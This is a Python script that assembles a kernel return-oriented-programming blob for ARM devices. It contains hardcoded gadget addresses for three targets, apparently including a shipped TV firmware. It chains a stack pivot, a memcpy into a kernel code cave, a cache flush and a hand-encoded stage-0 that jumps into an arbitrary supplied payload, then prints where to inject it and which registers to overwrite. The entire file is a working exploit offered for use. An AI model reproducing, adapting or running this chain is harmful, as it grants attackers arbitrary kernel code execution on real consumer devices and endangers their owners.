#!/usr/bin/env python3
"""Build the calibration-free cave-copy control blob.

The first 40 bytes are consumed by the kernel gadget
  ldm ip,{r2,r3,r4,r7,r8,r9,sl,sp,lr,pc}
while memcpy copies the same source to CAVE-40. Consequently source+40 is the
copy-window exit frame at CAVE, source+80 the runtime-r1 saver frame,
source+108 the coherent-flushed stage-0, source+132 the flush-wrapper frame,
and source+152 the full payload.

Profiles are exact shipped/lab addresses derived by ROPgadget + ksymtab.
"""
import argparse, struct

PROFILES = {
    "lab": {
        "ldm_ip": 0xC04DD17C,
        "copy_window": 0xC0108024,
        "memcpy": 0xC01FACA0,
        "save_r1": 0xC0451A70,
        "flush_wrapper": 0xC001270C,
        "coherent": 0xC001CFC0,
    },
    "tv": {
        "ldm_ip": 0xC053107C,
        "copy_window": 0xC010A158,
        "memcpy": 0xC02014C0,
        "save_r1": 0xC04A4E5C,
        "flush_wrapper": 0xC0012B94,
        "coherent": 0xC001CEE8,
    },
    "nikem": {
        "ldm_ip": 0xC05455BC,
        "copy_window": 0xC010F424,
        "memcpy": 0xC020B120,
        "save_r1": 0xC04B35D0,
        "flush_wrapper": 0xC00128EC,
        "coherent": 0xC001D808,
    },
}

CAVE = 0xC0008400
DEST = CAVE - 40
STORE_FRAME = CAVE + 40
STAGE0 = CAVE + 68
FLUSH_FRAME = CAVE + 92
FULL = CAVE + 112
FAKE_SP = CAVE + 0xA00
SAVE_IP = CAVE + 0x900

def p32(x): return struct.pack("<I", x & 0xffffffff)
def words(*xs): return b"".join(p32(x) for x in xs)

def build(profile, payload):
    p = PROFILES[profile]
    copy_len = FULL - DEST + len(payload)
    copy_len = (copy_len + 3) & ~3

    # Source +0: LDM control frame. r4 has intentionally-small copy length;
    # its zero high halfword terminates only disposable r7/r8 bytes before
    # the next C1 fragment resumes at source+20.
    ldm = words(
        0x41414141,        # r2 (copy window overwrites it from r4)
        p["memcpy"],       # r3
        copy_len,          # r4 -> r2
        0x42424242,        # r7 (may remain original after terminator)
        0x43434343,        # r8 (may remain original)
        0x44444444,        # r9
        0x45454545,        # sl
        FAKE_SP,           # sp
        0x46464646,        # lr
        p["copy_window"],  # pc
    )

    # Source +40 -> CAVE: copy-window common-exit frame. It saves post-copy
    # r1 (original runtime ip + copy_len) at SAVE_IP.
    frame1 = words(
        SAVE_IP - 0x18,    # r4: save gadget stores r1 at r4+0x18
        0x47474747, 0x48484848, 0x49494949,
        0x4a4a4a4a, 0x4b4b4b4b, 0x4c4c4c4c,
        STORE_FRAME + 28,  # fp -> save-r1 epilogue frame
        FAKE_SP,
        p["save_r1"],
    )

    # Source +80 -> STORE_FRAME: after saving r1, continue to the 28-byte
    # cache-flush wrapper.
    store_frame = words(
        STAGE0,            # r4: wrapper flush range start
        0x4d4d4d4d, 0x4e4e4e4e, 0x4f4f4f4f,
        FLUSH_FRAME + 20,  # fp -> flush-wrapper epilogue frame
        FAKE_SP,
        p["flush_wrapper"],
    )

    # Source +108 -> STAGE0 (24 bytes): flush full stage, branch there.
    full_end = FULL + len(payload)
    stage0 = words(
        0xE1A00004,        # mov r0,r4
        0xE1A01005,        # mov r1,r5
        0xE59F3004,        # ldr r3,[pc,#4] -> literal at +20
        0xE12FFF33,        # blx r3
        0xE1A0F004,        # mov pc,r4
        p["coherent"],
    )

    # Source +132 -> FLUSH_FRAME: return from wrapper into STAGE0.
    flush_frame = words(
        FULL,
        full_end,
        0x50505050,
        FAKE_SP,
        STAGE0,
    )

    pad = b"\x51" * (FULL - DEST -
                      (len(ldm)+len(frame1)+len(store_frame)+len(stage0)+len(flush_frame)))
    if len(pad) < 0:
        raise AssertionError("cave layout overlaps")
    out = ldm + frame1 + store_frame + stage0 + flush_frame + pad + payload
    out += b"A" * (copy_len - len(out))
    return out


def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--profile",choices=PROFILES,required=True)
    ap.add_argument("--payload",required=True)
    ap.add_argument("--out",required=True)
    a=ap.parse_args()
    payload=open(a.payload,"rb").read()
    out=build(a.profile,payload)
    open(a.out,"wb").write(out)
    print(f"wrote {a.out}: {len(out)} bytes; inject at payload offset 1420")
    p = PROFILES[a.profile]
    print(f"frame register puts: r6@528={DEST:#x} fp@548={CAVE+40:#x} "
          f"sp@552={FAKE_SP:#x} pc@556={p['ldm_ip']:#x}")

if __name__=="__main__": main()
